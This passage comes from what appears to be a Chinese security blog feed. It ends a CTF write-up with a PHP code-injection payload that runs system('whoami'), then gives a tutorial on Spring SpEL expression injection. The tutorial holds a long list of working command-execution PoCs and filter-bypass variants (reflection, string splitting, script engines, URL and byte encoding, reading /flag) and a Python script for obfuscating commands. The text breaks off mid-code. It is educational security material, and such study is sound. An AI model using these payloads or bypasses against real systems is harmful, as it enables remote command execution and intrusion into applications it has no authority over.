class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;1;&#125;system(&#x27;whoami&#x27;);/*&quot;</span>;<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;command&quot;</span>.<span class="hljs-variable">$command</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/html/</span>A<span class="hljs-regexp">/t/</span>tpl<span class="hljs-regexp">/common/</span>Command.php?command=Y29tbWFuZE1UdDljM2x6ZEdWdEtDZDNhRzloYldrbktUc3ZLZz09<br></code></pre></td></tr></table></figure><p>这里直接访问是因为admin.php的路由里面写了<code>/A/t/tpl</code>下面是静态文件，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>定义静态文件路径<br>define(<span class="hljs-string">&#x27;Tpl_style&#x27;</span>,<span class="hljs-string">&#x27;/A/t/tpl&#x27;</span>);<br></code></pre></td></tr></table></figure><p>静态文件是可以直接通过路径访问到的</p><p>此次比赛深刻教训：要去学学怎么种不死马维持权限， 不然只能拿到前面几轮的flag后面基本就只有挨打的份了。</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpEL表达式注入</title>
    <link href="/2024/05/28/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/05/28/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="spel基础"><a class="markdownIt-Anchor" href="#spel基础"></a> SpEL基础</h3><p>Springboot3 开始引入了Spring表达式语言（Spring Expression Language，简称SpEL），可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p><p>Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。</p><p>Bean是指一个由Spring容器管理的对象。这个对象可以是任何一个Java类的实例。Bean的主要优势是可以将对象的创建和管理与业务逻辑分离。这使得应用程序更加灵活和易于维护。</p><p>SpEL有许多特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h4 id="spel定界符"><a class="markdownIt-Anchor" href="#spel定界符"></a> SpEL定界符<code>#&#123;&#125;</code></h4><p>所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p><p><code>#&#123;&#125;</code>与<code>$&#123;&#125;</code>区别：</p><ul><li><code>#&#123;&#125;</code>就是SpEL的定界符，用于指明内容为SpEL表达式并执行；</li><li><code>$&#123;&#125;</code>主要用于加载<strong>外部属性</strong>文件中的值；</li><li>两者可以混合使用，但是必须<code>#&#123;&#125;</code>在外面，<code>$&#123;&#125;</code>在里面，如<code>#&#123;'$&#123;&#125;'&#125;</code>，注意单引号是字符串类型才添加的；</li></ul><h4 id="spel表达式类型"><a class="markdownIt-Anchor" href="#spel表达式类型"></a> SpEL表达式类型</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;666&#125;&quot;</span>/&gt; #给属性复制<br>&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;the value is #&#123;666&#125;&quot;</span>/&gt; #和字符串混用<br>&lt;constructor-arg <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;test&#125;&quot;</span>/&gt; #对bean进行引用，test的其他bean的id<br></code></pre></td></tr></table></figure><h4 id="引用类属性"><a class="markdownIt-Anchor" href="#引用类属性"></a> 引用类属性</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;bean id<span class="hljs-operator">=</span><span class="hljs-string">&quot;carl&quot;</span> class<span class="hljs-operator">=</span><span class="hljs-string">&quot;com.spring.entity.Instrumentalist&quot;</span>&gt;<br>    &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;instrument&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;#&#123;kenny.instrument&#125;&quot;</span>/&gt;<br>    &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;song&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;#&#123;kenny.song&#125;&quot;</span>/&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><h4 id="引用类方法"><a class="markdownIt-Anchor" href="#引用类方法"></a> 引用类方法</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()&#125;&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()?.toUpperCase()&#125;&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><code>?.</code>符号会确保左边的表达式不会为<code>null</code>，如果为<code>null</code>的话就不会调用<code>toUpperCase()</code>方法了，防止抛出<code>NullPointerException</code>错误</p><h4 id="类类型表达式"><a class="markdownIt-Anchor" href="#类类型表达式"></a> 类类型表达式</h4><p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法。</p><p>使用<code>T(Type)</code>来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;random&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(java.lang.<span class="hljs-keyword">Math</span>).random()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>弹计算器</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.spel.HelloWorld&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#</span></span></span><span class="language-xquery">&#123;T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="spel使用"><a class="markdownIt-Anchor" href="#spel使用"></a> SpEL使用</h4><p>可以使用SpEL的位置：</p><ul><li><p>注解@Value中</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailSender</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String mailUsername;<br>    <span class="hljs-meta">@Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)</span>    <br>    <span class="hljs-keyword">private</span> String defaultLocale;<br>    <span class="hljs-comment">//...</span><br><br></code></pre></td></tr></table></figure></li><li><p>XML配置（如上面的Beans.xml）</p></li><li><p>代码块中使用Expression</p><p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;(&#x27;Hello&#x27; + &#x27; fru1ts&#x27;).concat(#end)&quot;</span>);<br><span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>context.setVariable(<span class="hljs-string">&quot;end&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>);<br>System.out.println(expression.getValue(context));<br></code></pre></td></tr></table></figure><p>Expression会将传入parseExpression()函数的字符串参数当初SpEL表达式来解析，而无需通过<code>#&#123;&#125;</code>符号来注明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(spel);<br>System.out.println(expression.getValue());<br></code></pre></td></tr></table></figure></li></ul><h3 id="spel表达式注入漏洞"><a class="markdownIt-Anchor" href="#spel表达式注入漏洞"></a> SpEL表达式注入漏洞</h3><h4 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h4><ul><li>SimpleEvaluationContext ：仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用</li><li>StandardEvaluationContext （默认）：支持全部SpEL语法</li></ul><p>SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><h4 id="探测"><a class="markdownIt-Anchor" href="#探测"></a> 探测</h4><ul><li>源码里面找类</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.Expression</span><br>org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.ExpressionParser</span><br>org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span><span class="hljs-selector-class">.standard</span>.SpelExpressionParser<br></code></pre></td></tr></table></figure><ul><li>找特征</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ExpressionParser parser = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SpelExpressionParser()</span>;<br>Expression expression = parser.parse<span class="hljs-constructor">Expression(<span class="hljs-params">str</span>)</span>;<br>expression.get<span class="hljs-constructor">Value()</span><br>expression.set<span class="hljs-constructor">Value()</span><br></code></pre></td></tr></table></figure><h4 id="常见poc与绕过"><a class="markdownIt-Anchor" href="#常见poc与绕过"></a> 常见POC与绕过</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// PoC原型</span><br>#Runtime<br><span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-constructor">T(Runtime)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br>#ProcessBuilder<br><span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(&#123;&#x27;<span class="hljs-params">calc</span>&#x27;&#125;)</span>.start<span class="hljs-literal">()</span><br><span class="hljs-keyword">new</span> <span class="hljs-constructor">ProcessBuilder(&#123;&#x27;<span class="hljs-params">calc</span>&#x27;&#125;)</span>.start<span class="hljs-literal">()</span><br><br><span class="hljs-comment">// Bypass技巧</span><br><br>#反射调用<br><span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br>#同上，需要有上下文环境<br>#this.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br># 反射调用+字符串拼接，绕过如javacon题目中的正则过滤<br><span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>),<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br># 同上，需要有上下文环境<br>#this.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>),<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br># 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1<br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br><span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.String(<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[]&#123;99,97,108,99&#125;)</span>).start<span class="hljs-literal">()</span><br><br># 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2<br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br><span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(99)</span>.concat(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(97)</span>).concat(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(108)</span>).concat(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(99)</span>))<br><br># JavaScript引擎通用PoC<br><span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>)</span>.eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)<br><br><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.StreamUtils)</span>.copy(<span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>)</span>.eval(<span class="hljs-string">&quot;xxx&quot;</span>),)<br><br># JavaScript引擎+反射调用<br><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.StreamUtils)</span>.copy(<span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>)</span>.eval(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>),<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)),)<br><br># JavaScript引擎+URL编码<br><span class="hljs-comment">// 其中URL编码内容为：</span><br><span class="hljs-comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.StreamUtils)</span>.copy(<span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>)</span>.eval(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">net</span>.URLDecoder)</span>.decode(<span class="hljs-string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)<br><br># 黑名单过滤<span class="hljs-string">&quot;.getClass(&quot;</span>，可利用数组的方式绕过，还未测试成功<br>&#x27;<span class="hljs-character">&#x27;[&#x27;</span><span class="hljs-keyword">class</span>&#x27;].<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime&#x27;)</span>.get<span class="hljs-constructor">DeclaredMethods()</span><span class="hljs-literal">[<span class="hljs-number">15</span>]</span>.invoke(&#x27;<span class="hljs-character">&#x27;[&#x27;</span><span class="hljs-keyword">class</span>&#x27;].<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime&#x27;)</span>.get<span class="hljs-constructor">DeclaredMethods()</span><span class="hljs-literal">[<span class="hljs-number">7</span>]</span>.invoke(null),&#x27;calc&#x27;)<br><br># JDK9新增的shell，还未测试<br><span class="hljs-constructor">T(SomeWhitelistedClassNotPartOfJDK)</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;jdk.jshell.JShell&quot;</span>,<span class="hljs-params">true</span>)</span>.Methods<span class="hljs-literal">[<span class="hljs-number">6</span>]</span>.invoke(null,&#123;&#125;).eval(&#x27;whatever java code <span class="hljs-keyword">in</span> one statement&#x27;).<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><br>#java.nio读文件<br>&#x27;&#x27;.<span class="hljs-keyword">class</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">nio</span>.<span class="hljs-params">charset</span>.StandartCharsets&#x27;)</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UTF_8</span>.</span></span>decode(&#x27;&#x27;.<span class="hljs-keyword">class</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">nio</span>.ByteBuffer&#x27;)</span>.wrap(&#x27;&#x27;.<span class="hljs-keyword">class</span>.forname(&#x27;java.nio.file.Files&#x27;),read<span class="hljs-constructor">AllBytes(&#x27;&#x27;.<span class="hljs-params">class</span>.<span class="hljs-params">forName</span>(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">nio</span>.<span class="hljs-params">file</span>.Paths&#x27;)</span>.get(&#x27;/flag&#x27;))))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter message to encode:&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decoded string (in ASCII):\n&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;T(java.lang.Character).toString(%s)&#x27;</span> % <span class="hljs-built_in">ord</span>(message[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> message[<span class="hljs-number">1</span>:]:<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="hljs-built_in">ord</span>(ch), end=<span class="hljs-string">&quot;&quot;</span>), <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;new java.lang.String(new byte[]&#123;&#x27;</span>, end=<span class="hljs-string">&quot;&quot;</span>),<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">ord</span>(message[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> message[<span class="hljs-number">1</span>:]:<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;,%s&#x27;</span> % <span class="hljs-built_in">ord</span>(ch), end=<span class="hljs-string">&quot;&quot;</span>), <br><span 